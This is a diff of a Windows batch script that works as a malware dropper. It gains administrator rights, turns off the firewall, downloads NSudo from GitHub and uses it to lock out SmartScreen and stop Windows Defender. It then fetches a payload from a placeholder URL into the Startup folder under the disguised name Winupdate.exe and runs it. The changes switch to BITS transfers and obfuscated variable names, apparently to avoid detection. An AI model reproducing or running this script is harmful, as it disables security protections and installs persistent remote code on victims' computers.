@@ -1,4 +1,5 @@
 @echo off
+
 :: BatchGotAdmin
 ::-------------------------------------
 REM  --> Check for permissions
@@ -73,14 +74,22 @@ powershell.exe -command "netsh advfirewall set allprofiles state off"
 
 
 cd  %temp%
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe', '.\NSudo.exe') }
+
+bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
+
+set xxx=%systemroot%
+
+set i-love-you-hande-ercel=System32
 
 
-NSudo.exe -U:T -ShowWindowMode:Hide %y% "%jack%\%sparrow%\%hande-cuty%" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+NSudo.exe -U:T -ShowWindowMode:Hide icacls "%xxx%\%i-love-you-hande-ercel%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+
  
 NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend 
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://direct-url/foryour-payload', '.\payload.exe') }
-start payload.exe 
+
+powershell -command "start-bitstransfer https://direct-url-for-payload/xxx.exe   .\Winupdate.exe"
+
+start Winupdate.exe
 
